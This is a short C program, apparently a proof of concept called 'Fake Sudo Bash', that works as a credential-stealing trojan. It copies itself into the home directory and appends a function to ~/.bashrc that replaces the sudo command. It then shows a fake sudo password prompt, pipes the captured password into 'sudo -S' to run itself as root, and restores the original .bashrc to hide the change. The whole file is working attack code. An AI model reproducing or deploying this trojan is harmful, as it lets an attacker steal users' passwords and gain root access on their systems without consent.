/**
   Fake Sudo Bash
   Copyright (C) 2017 https://github.com/JoseCarlosGarcia95
   
   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.
   
   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>

const char * get_home_path(const char * path) {
  char * homePath;
  homePath = malloc(strlen(path) + strlen(getenv("HOME")) + 1);
  homePath[0] = 0;
  
  strcat(homePath, getenv("HOME"));
  strcat(homePath, path);

  return homePath;
}

void make_fake_sudo() {
  char * cmd, *password;
  
  printf("[sudo] password for %s: ", getenv("USER"));
  
  password = getpass("");
  
  cmd = malloc(50);
  sprintf(cmd, "echo %s | sudo -S ~/.sudo", password);
  system(cmd);
}

void run_as_sudo() {
  printf("Hey! I'm root, What about you?\n");
}


int copy_file(const char *from,const char *to) {
  FILE *ffrom = fopen(from, "r");
  if (!ffrom) return 0;
  FILE *fto = fopen(to, "w");
  if (!fto) return 0;
  int inch;
  while (1) {
    inch = fgetc(ffrom);
    if (inch == EOF) break;
    if (fputc(inch, fto) == EOF) break;
  }
  fclose(fto);
  fclose(ffrom);
  return 1;
}

void clear_sudo() {
  remove(get_home_path("/.bashrc"));
  copy_file(get_home_path("/.bashrc.back"), get_home_path("/.bashrc"));
  remove(get_home_path("/.bashrc.back"));
}

void make_copy_sudo(const char * file) {
  copy_file(file, get_home_path("/.sudo"));
  chmod(get_home_path("/.sudo"), 0744);
}


void redirect_sudo() {
  FILE * fp;

  copy_file(get_home_path("/.bashrc"), get_home_path("/.bashrc.back"));
  
  fp = fopen(get_home_path("/.bashrc"), "a+");
  char * payload = "\nfunction sudo { './.sudo'; }";
  fwrite(payload, 1, strlen(payload), fp);
  fclose(fp);
}
int main(int argc, char* argv[]) {
  if(getuid() == 0) {
    run_as_sudo();
  } else if(!strcmp(argv[0], "./.sudo")) {
    make_fake_sudo();
    clear_sudo();
  } else {
    make_copy_sudo(argv[0]);
    redirect_sudo();
  }
}
